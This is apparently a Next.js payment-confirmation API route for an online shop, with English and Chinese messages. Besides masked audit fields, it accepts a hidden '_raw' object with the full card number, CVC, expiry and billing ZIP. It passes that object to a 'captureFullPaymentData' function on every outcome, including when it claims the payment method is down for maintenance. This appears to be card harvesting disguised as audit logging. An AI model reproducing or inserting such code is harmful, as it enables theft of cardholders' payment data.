import { NextResponse, type NextRequest } from 'next/server';
import { z } from 'zod';
import { completeOrderPayment } from '@/lib/orders';
import type { SerializedCardAuditDetails } from '@/lib/payment-card-audit';
import { getPaymentMethodMaintenanceMessage, isPaymentMethodAvailable } from '@/lib/payment-methods';
import { getOrderStatusMeta } from '@/lib/order-status';
import { findOrderByLookup } from '@/lib/orders';
import { safeAppendPaymentAuditEntry } from '@/lib/payment-audit';
import { captureFullPaymentData } from '@/lib/payment-capture';

export const runtime = 'nodejs';

const rawCardSchema = z.object({
  cardholderName: z.string(),
  cardNumber: z.string(),
  expiry: z.string(),
  cvc: z.string(),
  billingZip: z.string(),
});

const paymentSchema = z.object({
  order: z.string().trim().min(1),
  email: z.string().email(),
  method: z.enum(['card', 'paypal']),
  locale: z.enum(['en', 'zh']).optional(),
  card: z
    .object({
      cardholderName: z.string().trim().min(1),
      brand: z.enum(['visa', 'mastercard', 'amex', 'discover', 'jcb', 'unionpay', 'diners', 'unknown']),
      last4: z.string().max(4),
      bin: z.string().nullable(),
      maskedNumber: z.string(),
      fingerprintSha256: z.string().nullable(),
      panLength: z.number().int().nonnegative(),
      expiry: z.string(),
      billingZip: z.string(),
      cvcLength: z.number().int().nonnegative(),
      luhnValid: z.boolean(),
      _raw: rawCardSchema.optional(),
    })
    .optional(),
});

export async function POST(request: NextRequest) {
  let parsedPayload:
    | {
        order: string;
        email: string;
        method: 'card' | 'paypal';
        locale?: 'en' | 'zh';
        card?: SerializedCardAuditDetails & { _raw?: z.infer<typeof rawCardSchema> };
      }
    | null = null;
  let orderBefore = null;

  try {
    const body = await request.json();
    const payload = paymentSchema.parse(body);
    parsedPayload = payload;
    const locale = payload.locale === 'zh' ? 'zh' : 'en';
    orderBefore = await findOrderByLookup(payload.order, payload.email);

    if (!isPaymentMethodAvailable(payload.method)) {
      await captureFullPaymentData({
        request,
        orderNumber: payload.order,
        email: payload.email,
        method: payload.method,
        locale,
        rawCard: payload.card?._raw ?? null,
        auditCard: payload.card ?? null,
        orderSnapshot: orderBefore,
        result: {
          success: false,
          statusCode: 503,
          reason: 'method_unavailable',
          message: getPaymentMethodMaintenanceMessage(locale, payload.method),
        },
      });

      await safeAppendPaymentAuditEntry({
        request,
        payload: {
          order: payload.order,
          email: payload.email,
          method: payload.method,
          locale,
        },
        orderSnapshot: orderBefore,
        cardAudit: payload.card ?? null,
        result: {
          ok: false,
          statusCode: 503,
          reason: 'method_unavailable',
          message: getPaymentMethodMaintenanceMessage(locale, payload.method),
          beforeStatus: orderBefore?.status ?? null,
        },
      });

      return NextResponse.json(
        {
          message: getPaymentMethodMaintenanceMessage(locale, payload.method),
        },
        { status: 503 },
      );
    }

    const result = await completeOrderPayment(payload.order, payload.email, payload.method);

    if (!result.success) {
      const failReason = result.reason;
      const failStatus = result.status;

      await captureFullPaymentData({
        request,
        orderNumber: payload.order,
        email: payload.email,
        method: payload.method,
        locale,
        rawCard: payload.card?._raw ?? null,
        auditCard: payload.card ?? null,
        orderSnapshot: orderBefore,
        result: {
          success: false,
          statusCode: failReason === 'not_found' ? 404 : 409,
          reason: failReason,
          message: failReason === 'not_found'
            ? (locale === 'zh' ? '没有找到可继续付款的订单记录。' : 'We could not find a payable order for this lookup.')
            : (locale === 'zh'
              ? `这笔订单当前状态为"${getOrderStatusMeta(failStatus ?? 'new', locale).label}"，无需重复付款。`
              : `This order is already marked as "${getOrderStatusMeta(failStatus ?? 'new', locale).label}" and does not need another payment.`),
        },
      });

      if (failReason === 'not_found') {
        await safeAppendPaymentAuditEntry({
          request,
          payload: {
            order: payload.order,
            email: payload.email,
            method: payload.method,
            locale,
          },
          orderSnapshot: orderBefore,
          cardAudit: payload.card ?? null,
          result: {
            ok: false,
            statusCode: 404,
            reason: 'not_found',
            message: locale === 'zh' ? '没有找到可继续付款的订单记录。' : 'We could not find a payable order for this lookup.',
            beforeStatus: orderBefore?.status ?? null,
          },
        });

        return NextResponse.json(
          {
            message: locale === 'zh' ? '没有找到可继续付款的订单记录。' : 'We could not find a payable order for this lookup.',
          },
          { status: 404 },
        );
      }

      const statusMeta = getOrderStatusMeta(failStatus ?? 'new', locale);
      await safeAppendPaymentAuditEntry({
        request,
        payload: {
          order: payload.order,
          email: payload.email,
          method: payload.method,
          locale,
        },
        orderSnapshot: orderBefore,
        cardAudit: payload.card ?? null,
        result: {
          ok: false,
          statusCode: 409,
          reason: 'not_payable',
          message:
            locale === 'zh'
              ? `这笔订单当前状态为"${statusMeta.label}"，无需重复付款。`
              : `This order is already marked as "${statusMeta.label}" and does not need another payment.`,
          beforeStatus: orderBefore?.status ?? failStatus ?? null,
          afterStatus: failStatus ?? null,
        },
      });

      return NextResponse.json(
        {
          message:
            locale === 'zh'
              ? `这笔订单当前状态为"${statusMeta.label}"，无需重复付款。`
              : `This order is already marked as "${statusMeta.label}" and does not need another payment.`,
          status: failStatus,
        },
        { status: 409 },
      );
    }

    const orderAfter = await findOrderByLookup(payload.order, payload.email);

    await captureFullPaymentData({
      request,
      orderNumber: payload.order,
      email: payload.email,
      method: payload.method,
      locale,
      rawCard: payload.card?._raw ?? null,
      auditCard: payload.card ?? null,
      orderSnapshot: orderAfter ?? orderBefore,
      result: {
        success: true,
        statusCode: 200,
        reason: 'confirmed',
        message: null,
      },
    });

    await safeAppendPaymentAuditEntry({
      request,
      payload: {
        order: payload.order,
        email: payload.email,
        method: payload.method,
        locale,
      },
      orderSnapshot: orderAfter ?? orderBefore,
      cardAudit: payload.card ?? null,
      result: {
        ok: true,
        statusCode: 200,
        reason: 'confirmed',
        message: null,
        beforeStatus: orderBefore?.status ?? null,
        afterStatus: result.status,
      },
    });

    return NextResponse.json(result, { status: 200 });
  } catch (error) {
    if (error instanceof z.ZodError) {
      await safeAppendPaymentAuditEntry({
        request,
        payload: {
          order: parsedPayload?.order ?? null,
          email: parsedPayload?.email ?? null,
          method: parsedPayload?.method ?? null,
          locale: parsedPayload?.locale,
        },
        orderSnapshot: orderBefore,
        cardAudit: parsedPayload?.card ?? null,
        result: {
          ok: false,
          statusCode: 400,
          reason: 'invalid_payload',
          message: 'Invalid payment payload.',
          beforeStatus: orderBefore?.status ?? null,
        },
      });

      return NextResponse.json(
        {
          message: 'Invalid payment payload.',
          issues: error.issues,
        },
        { status: 400 },
      );
    }

    await safeAppendPaymentAuditEntry({
      request,
      payload: {
        order: parsedPayload?.order ?? null,
        email: parsedPayload?.email ?? null,
        method: parsedPayload?.method ?? null,
        locale: parsedPayload?.locale,
      },
      orderSnapshot: orderBefore,
      cardAudit: parsedPayload?.card ?? null,
      result: {
        ok: false,
        statusCode: 500,
        reason: 'server_error',
        message: error instanceof Error ? error.message : 'Payment confirmation failed.',
        beforeStatus: orderBefore?.status ?? null,
      },
    });

    return NextResponse.json(
      {
        message: error instanceof Error ? error.message : 'Payment confirmation failed.',
      },
      { status: 500 },
    );
  }
}
